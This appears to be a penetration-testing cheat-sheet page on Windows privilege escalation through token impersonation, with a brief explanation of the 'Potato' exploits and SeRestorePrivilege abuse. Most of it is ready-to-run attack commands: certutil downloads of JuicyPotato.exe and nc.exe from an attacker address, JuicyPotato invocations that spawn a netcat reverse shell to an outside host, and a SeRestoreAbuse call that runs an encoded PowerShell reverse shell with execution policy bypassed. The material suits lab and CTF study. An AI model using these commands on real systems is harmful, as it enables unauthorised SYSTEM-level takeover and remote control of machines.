# Token Impersonation

Service accounts, briefly mentioned in the introduction task, may have a higher privilege level than the low-level user you may have. In Windows versions before Server 2019 and 10 (version 1809), these service accounts are affected by an internal man-in-the-middle vulnerability. As you may know, man-in-the-middle (MitM) attacks are conducted by intercepting network traffic. In a similar fashion, higher privileged service accounts will be forced to authenticate to a local port we listen on. Once the service account attempts to authenticate, this request is modified to negotiate a security token for the "NT AUTHORITY\SYSTEM" account. The security token obtained can be used by the user we have in a process called "impersonation". Although it has led to several exploits, the impersonation rights were not a vulnerability.

`whoami /priv`

Doing further research on token impersonation vulnerabilities, you will see a number of different exploits exist. These have whimsical names such as Hot Potato, Rotten Potato, Lonely Potato, Juicy Potato, etc. You will be able to decide on which "Potato" better suits your need depending on the version of the target system. While some of these exploits will run on the target system, others may require you to set up a fake server on the same network.





We will need to check the list of [CLSID](http://ohpe.it/juicy-potato/CLSID/) to use the exploit.



**Exploit and CLSID list**:

```
https://github.com/ohpe/juicy-potato
```

{% code overflow="wrap" %}
```
certutil.exe -urlcache -f http://10.10.XX.XX/JuicyPotato.exe C:\Temp\JuicyPotato.exe
certutil.exe -urlcache -f http://10.10.XX.XX/nc.exe C:\Temp\nc.exe
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\inetpub\drupal-7.54\nc.exe -e cmd.exe 10.10.XX.XX 555" -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}

or without a CLSID
 .\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\Users\merlin\Desktop\nc.exe -e cmd.exe 10.10.16.22 5555" -t * 
```
{% endcode %}

## SeRestorePrivilege

check this walk-through here [https://www.youtube.com/watch?v=1nRzABu6eKU](https://www.youtube.com/watch?v=1nRzABu6eKU) and use this tool [https://github.com/xct/SeRestoreAbuse](https://github.com/xct/SeRestoreAbuse)&#x20;

Encode PS reverse oneliner to UTF-16LE + base64

```
.\SeRestoreAbuse.exe "cmd /c powershell -exec bypass -enc <base64 encoded reverse shell here>"
```

